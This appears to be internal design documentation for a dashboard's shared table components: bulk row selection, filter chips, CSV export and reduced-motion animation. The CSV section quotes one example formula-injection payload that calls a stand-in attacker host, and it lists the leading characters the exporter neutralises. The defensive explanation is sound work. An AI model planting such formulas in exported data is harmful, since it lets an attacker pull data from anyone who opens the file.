# Enterprise table capabilities

**Code:** `dashboard/src/components/ui/DataTable.tsx`,
`dashboard/src/components/ui/FilterChips.tsx`,
`dashboard/src/components/ui/StatCardRow.tsx`,
`dashboard/src/lib/csv.ts` ·
**Tests:** `dashboard/src/lib/__tests__/csv.test.ts`,
`dashboard/src/components/ui/__tests__/FilterChips.test.ts`

## Purpose

Shared, opt-in primitives that bring the platform's tables and dashboards to an
enterprise standard — row selection with bulk actions, dismissible faceted
filters, safe CSV export, and a restrained entrance animation — without
rewriting the 36 pages that already use `DataTable`.

## Why it exists

An audit against the Fortune-500 SaaS bar found three genuine gaps (and several
things already done, which were left alone):

- **Already done, not touched:** cross-module interlinks (Incident → model via
  `InterlinkChip`, Risk → controls via `/controls/:id`, Agent → detail via a
  `?open=` Sheet), `EmptyState`/`ErrorState`, `StatusPill`, pill links, design
  tokens. Phase 1's dead-ends were, in the main, already fixed.
- **Missing:** bulk selection/actions on tables, per-facet dismissible filter
  chips (the `FilterBar` showed a count, not which filters), and entrance
  motion. These are what this module adds.

It also closes a security defect found along the way — see **CSV export**.

## How it works

### Row selection and bulk actions (`DataTable`)

Three new **optional** props, so every existing `DataTable` is unchanged:

| Prop | Meaning |
| --- | --- |
| `selectable` | turns on the checkbox column |
| `getRowId(row)` | **required when selectable** — a stable identity |
| `bulkActions(selected, clear)` | render-prop for the floating bar's buttons |

Selection is keyed by `getRowId`, never by row index: index is not stable
across sort/filter, so selecting "row 3" and re-sorting would silently move the
selection to a different record. The header checkbox acts on the **current page
only** — selecting rows the operator cannot see is how a bulk delete hits the
wrong records. The selected *rows* are resolved from the full data set, so a
selection survives paging away and back.

A page owns its bulk actions. The floating bar renders whatever the page's
`bulkActions` returns, so a **mutating** action is the page's own real,
throwing service call — this component never fabricates success. The reference
wiring (`VendorRegistry`) ships one safe action, **Export selected to CSV**;
mutating actions (bulk re-assess, bulk approve) are added per page only where a
real per-row service method exists.

### Faceted filter chips (`FilterChips`)

`deriveFacets(state, labels, allValue)` turns a filter-state object into the
list of *active* facets — a facet is active only when set and not the "no
filter" sentinel (empty, or an explicit `all`). Pure, so the chip row is a
function of the filter state and cannot drift from it. `FilterChips` renders
each as `Label: Value ×`, plus **Clear all** once more than one is active, and
renders **nothing** when none are active (safe to mount unconditionally).

### CSV export (`lib/csv.ts`) — and the injection it closes

`toCsv` / `downloadCsv` do two things a naive `rows.join(',')` does not:

1. **Quote** per RFC 4180 — a comma, quote or newline in a free-text field
   (a risk description, a remediation note) no longer corrupts the row.
2. **Neutralise formula injection (CWE-1236).** A cell beginning with
   `= + - @`, tab or CR is prefixed with `'`, so a spreadsheet renders
   `=WEBSERVICE("http://attacker")` as text instead of executing it. Many
   exported fields are attacker-influenceable — a vendor name, an owner, a
   resource tag synced from a connected integration. The prior hand-rolled
   exporters quoted (some of) the fields but did **not** guard this.

The platform has ~24 hand-rolled exporters; `ModelRegistry` and `VendorRegistry`
are migrated, the rest tracked in
[`../reference/technical-debt.md`](../reference/technical-debt.md) **TD-021**.

### Entrance motion (`StatCardRow`, tailwind)

A `fade-in-up` keyframe (Tailwind, no Framer Motion — a fade+rise does not
justify a 50 KB runtime) staggers the KPI cards by 60 ms each. Zeroed out under
`prefers-reduced-motion` (WCAG 2.3.3) in `index.css`, because a board-facing
product must respect that setting. The bulk-action bar uses the shorter
`in-up`.

## Accessibility

- Selection checkboxes are native `<input type="checkbox">` — keyboard, focus
  ring and form semantics for free; the header's indeterminate (partial-page)
  state is set via ref.
- The bulk bar is a labelled `role="region"` with an `aria-live="polite"` count,
  so the selection total is announced without stealing focus.
- Filter-chip remove buttons carry `aria-label="Remove <facet> filter"`.
- All entrance animation is disabled under reduced-motion.

## Operations

- All four primitives are **opt-in**; nothing changes on a page until it passes
  the new props or imports the util. No visual regression risk to the other 34
  `DataTable` pages.
- To add bulk actions to a page: pass `selectable`, `getRowId`, and a
  `bulkActions` render-prop. For a mutating action, call the page's real service
  per selected row and `clear()` on success — never a stub.

## History

- **2026-09** — Module created: `DataTable` selection + floating bulk bar,
  `FilterChips`, injection-safe `lib/csv.ts`, and `fade-in-up` entrance motion.
  `ModelRegistry` and `VendorRegistry` migrated onto the safe CSV util (closing
  their formula-injection exposure); the remaining ~22 exporters tracked as
  TD-021.
